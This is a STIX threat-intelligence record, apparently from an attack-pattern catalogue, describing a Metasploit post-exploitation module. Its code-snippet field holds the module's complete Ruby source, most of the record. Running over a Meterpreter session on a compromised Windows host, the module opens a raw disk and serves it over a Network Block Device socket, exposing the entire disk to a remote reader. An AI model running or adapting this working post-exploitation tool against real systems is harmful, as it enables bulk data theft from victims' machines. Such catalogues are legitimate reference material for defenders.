{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fd570e72-38cd-4498-a3ae-a19c6a59ba3b",
    "created": "2024-08-14T16:33:04.989777Z",
    "modified": "2024-08-14T16:33:04.989781Z",
    "name": "Windows Manage Local NBD Server for Remote Disks",
    "description": " Maps remote disks and logical volumes to a local Network Block Device server. Allows for forensic tools to be executed on the remote disk directly.  'License' => MSF_LICENSE 'Platform' => ['win'] 'SessionTypes' => ['meterpreter']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/nbd_server.rb",
            "external_id": "nbd_server.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n#\n# Maps remote disks and logical volumes to a local Network Block Device\n# server. Allows for forensic tools to be executed on the remote disk\n# directly.\n#\n# R. Wesley McGrew wesley@mcgrewsecurity.com\n#    http://mcgrewsecurity.com\n# Mississippi State University National Forensics Training Center\n#    http://msu-nftc.org\n\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Local NBD Server for Remote Disks',\n        'Description' => %q{\n          Maps remote disks and logical volumes to a local Network Block\n          Device server. Allows for forensic tools to be executed on the remote disk directly.\n        },\n        'License' => MSF_LICENSE,\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Author' => ['Wesley McGrew <wesley[at]mcgrewsecurity.com>'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n            ]\n          }\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('DEVICE', [true, 'Device to map (use enum_drives for possible names)', nil]),\n        OptString.new('NBDIP', [false, 'IP address for NBD server', '0.0.0.0']),\n        OptInt.new('NBDPORT', [false, 'TCP port for NBD server', 10005]),\n      ]\n    )\n  end\n\n  def run\n    ip_addr = datastore['NBDIP']\n    port = datastore['NBDPORT']\n    devname = datastore['DEVICE']\n\n    invalid_handle_value = 0xFFFFFFFF\n    invalid_set_file_pointer = 0xFFFFFFFF\n    fsctl_allow_extended_dasd_io = 0x00090083\n    ioctl_disk_get_drive_geometry_ex = 0x000700A0\n\n    r = client.railgun.kernel32.CreateFileA(devname, 'GENERIC_READ',\n                                            0x3, nil, 'OPEN_EXISTING', 'FILE_ATTRIBUTE_READONLY', 0)\n    handle = r['return']\n    r = client.railgun.kernel32.DeviceIoControl(handle, fsctl_allow_extended_dasd_io, nil, 0, 0, 0, 4, nil)\n    ioctl = client.railgun.kernel32.DeviceIoControl(handle, ioctl_disk_get_drive_geometry_ex,\n                                                    '', 0, 200, 200, 4, '')\n    if ioctl['GetLastError'] == 6\n      ioctl = client.railgun.kernel32.DeviceIoControl(handle, ioctl_disk_get_drive_geometry_ex,\n                                                      '', 0, 200, 200, 4, '')\n    end\n    geometry = ioctl['lpOutBuffer']\n    disk_size = geometry[24, 31].unpack('Q')[0]\n\n    socket = Rex::Socket::TcpServer.create({ 'LocalHost' => ip_addr, 'LocalPort' => port })\n    print_status(\"Listening on #{ip_addr}:#{port}\")\n    print_status(\"Serving #{devname} (#{disk_size} bytes)\")\n    rsock = socket.accept\n    print_status('Accepted a connection')\n\n    # Negotiation\n    rsock.put('NBDMAGIC')\n    rsock.put(\"\\x00\\x00\\x42\\x02\\x81\\x86\\x12\\x53\")\n\n    rsock.put([disk_size].pack('Q').reverse)\n    rsock.put(\"\\x00\\x00\\x00\\x03\")  # Read-only\n    rsock.put(\"\\x00\" * 124)\n    print_line('Sent negotiation')\n\n    loop do\n      request = rsock.read(28)\n\n      unless request\n        print_error('No data received')\n        break\n      end\n\n      magic, request, nbd_handle, offset_n, length = request.unpack('NNa8a8N')\n\n      if magic != 0x25609513\n        print_error('Wrong magic number')\n        break\n      end\n      if request == 2\n        break\n      end\n\n      if request == 1\n        print_error('Attempted write on a read-only nbd')\n        break\n      end\n      next unless request == 0\n\n      client.railgun.kernel32.SetFilePointer(handle, offset_n[4, 7].unpack('N')[0],\n                                             offset_n[0, 4].unpack('N')[0], 0)\n      rsock.put(\"gDf\\x98\\x00\\x00\\x00\\x00\")\n      rsock.put(nbd_handle)\n      data = client.railgun.kernel32.ReadFile(handle, length, length, 4, nil)['lpBuffer']\n      rsock.put(data)\n    end\n\n    print_status('Closing')\n    rsock.close\n    socket.close\n\n    client.railgun.kernel32.CloseHandle(handle)\n  end\nend\n"
}